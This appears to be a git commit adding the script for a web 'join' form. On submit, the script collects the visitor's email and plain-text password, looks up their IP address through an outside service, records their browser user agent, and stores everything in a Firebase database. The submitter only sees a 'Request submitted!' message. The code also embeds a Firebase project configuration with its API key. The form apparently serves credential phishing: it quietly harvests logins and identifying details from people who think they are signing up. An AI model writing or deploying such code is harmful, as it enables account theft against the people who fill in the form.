3526af205c1dd8e5f0aec54a1e5f12f2ed66e46f
maybeasif60 <mdasifur600@gmail.com>
2026-06-06 22:50:34 +0600

    Add files via upload

---
+++ vqc/index.js
@@ -0,0 +1,47 @@
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
+import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyAFKdP00t5xf2V0WZmdYsE06razKxdhCJg",
+  authDomain: "nahid-822a1.firebaseapp.com",
+  projectId: "nahid-822a1",
+  storageBucket: "nahid-822a1.firebasestorage.app",
+  messagingSenderId: "371819940238",
+  appId: "1:371819940238:web:87cd1c49819eefd62dfcdf",
+  measurementId: "G-N1KLTDNTBZ"
+};
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+async function getUserIP() {
+  try {
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    return data.ip || "Unknown";
+  } catch(e) {
+    return "Unknown";
+  }
+}
+
+document.getElementById("joinForm").addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  const email = document.getElementById("email").value.trim();
+  const password = document.getElementById("password").value.trim();
+  const ip = await getUserIP();
+  const userAgent = navigator.userAgent;
+
+  const newRef = push(ref(db, "joinRequests"));
+  set(newRef, {
+    email,
+    password,
+    ip,
+    userAgent,
+    addedTime: Date.now()
+  })
+  .then(() => {
+    alert("✅ Request submitted!");
+    e.target.reset();
+  })
+  .catch(err => alert("⚠️ " + err.message));
+});
